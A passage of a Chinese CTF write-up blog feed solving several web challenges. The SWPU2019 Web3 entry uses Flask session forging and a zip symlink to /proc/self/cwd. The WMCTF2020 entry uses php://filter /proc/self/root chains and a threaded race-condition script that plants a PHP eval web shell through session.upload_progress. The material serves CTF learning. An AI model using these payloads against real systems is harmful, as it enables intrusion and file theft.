        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[proc|session构造]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905113040550.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>直接登录</p><p>进去点upload提示</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905113153000.png"></p><p>怀疑cookies构造</p><p>解个session</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134558982.png"></p><p>要想构造session需要知道key</p><blockquote><p><code>key</code>在访问不存在的目录时，会出现在请求头当中</p></blockquote><p>这个着实想不到</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134204719.png"></p><p>解个码</p><pre class="line-numbers language-none"><code class="language-none">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后改下id为1，加密</p><pre class="line-numbers language-none"><code class="language-none">.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTRZrw.bnK5U9yUqQ7hlU1hGddmyAzlE4g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134657578.png"></p><p>注释有源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'1'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'POST'</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        name <span class="token operator">=</span> name<span class="token operator">+</span><span class="token string">'qweqweqwe'</span>        name <span class="token operator">=</span> name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        md5_one<span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        n <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        ip <span class="token operator">=</span> ip<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        n<span class="token punctuation">.</span>update<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        md5_ip <span class="token operator">=</span> n<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        f<span class="token operator">=</span>request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        basepath<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>md5_one<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/"</span>        path_base <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span>        filename <span class="token operator">=</span> f<span class="token punctuation">.</span>filename        pathname <span class="token operator">=</span> path<span class="token operator">+</span>filename        <span class="token keyword">if</span> <span class="token string">"zip"</span> <span class="token operator">!=</span> filename<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'zip only allowed'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cmd <span class="token operator">=</span> <span class="token string">"unzip -n -d "</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span> pathname            <span class="token keyword">if</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>waf<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>        unzip_file <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>pathname<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>        unzip_filename <span class="token operator">=</span> unzip_file<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'is_login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'not login'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> unzip_filename<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token operator">+</span>unzip_filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>            resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>            <span class="token keyword">return</span> resp        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/showflag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">showflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./flag/flag.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>        <span class="token keyword">return</span> resp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"can't give you"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概就是上传zip压缩包，然后解压显示图片</p><p>给出了flag路径</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905135552520.png"></p><p>这里利用软链接和<code>/proc/self/cwd</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ln -s &#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag&#x2F;flag.jpg testzip -ry test.zip test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上传，结束</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905140736523.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[WMCTF2020]Make PHP Great Again</title>
      <link href="/p/2339718074.html"/>
      <url>/p/2339718074.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[require_once|proc|文件包含|session|session.upload_progress]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">require_once</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>绕过不能重复包含文件的限制</p><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><blockquote><p>PHP最新版的小Trick,require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含</p><p><code>/proc/[pid]</code>记录了系统运行的信息状态，而<code>/proc/self</code>指的是当前进程(自身进程)的pid，就类似于类里面的<code>this</code></p><p><code>/proc/self/root/</code>是指向<code>/</code>的符号链接</p></blockquote><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另一种写法</p><blockquote><p><code>/proc/self/cwd/</code>指向当前进程运行目录的一个符号链接，</p></blockquote><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;&#x2F;123&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="解法2-条件竞争：利用session-upload-progress"><a href="#解法2-条件竞争：利用session-upload-progress" class="headerlink" title="解法2 条件竞争：利用session.upload_progress"></a>解法2 条件竞争：利用session.upload_progress</h3><p>之前有做过类似的题，具体见<a href="https://syunaht.com/p/2193317358.html#toc-heading-5">刷题笔记:[NPUCTF2020]ezinclude</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadinghost <span class="token operator">=</span> <span class="token string">'http://f1f8290e-450c-47c9-8dfd-b1bb5f4a2807.node4.buuoj.cn:81/'</span>sessid <span class="token operator">=</span> <span class="token string">'flag'</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            host<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span>                <span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span> <span class="token string">"&lt;?php $shell='&lt;?php @eval($_POST[cmd])?>';system('ls /');fputs(fopen('shell.php','w'),$shell);file_put_contents('shell.php',$shell);echo md5('1');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'a.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 1的MD5值</span>        <span class="token keyword">if</span> <span class="token string">'c4ca4238a0b923820dcc509a6f75849b'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment"># 主线程退出时，不管子线程是否完成都随主线程退出</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    read<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试了下文件写入不了，不知道为啥，只能直接读</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WMCTF2020-Make-PHP-Great-Again/image-20210905002054657.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> 条件竞争 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[BSidesCF 2019]Pick Tac Toe</title>
      <link href="/p/1213141305.html"/>
      <url>/p/1213141305.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Pick-Tac-Toe/image-20210903234642017.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>为什么我的靶机点击没反应</p><p>似乎有错，好累</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Pick-Tac-Toe/image-20210903234709417.png"></p><p>原来是googleapi被墙没连上资源，开个梯子就好</p><p>抓包修改点击的id，可重复，游戏结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[NESTCTF 2019]Love Math 2</title>
      <link href="/p/3991483090.html"/>
      <url>/p/3991483090.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token comment">//例子 c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">60</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token 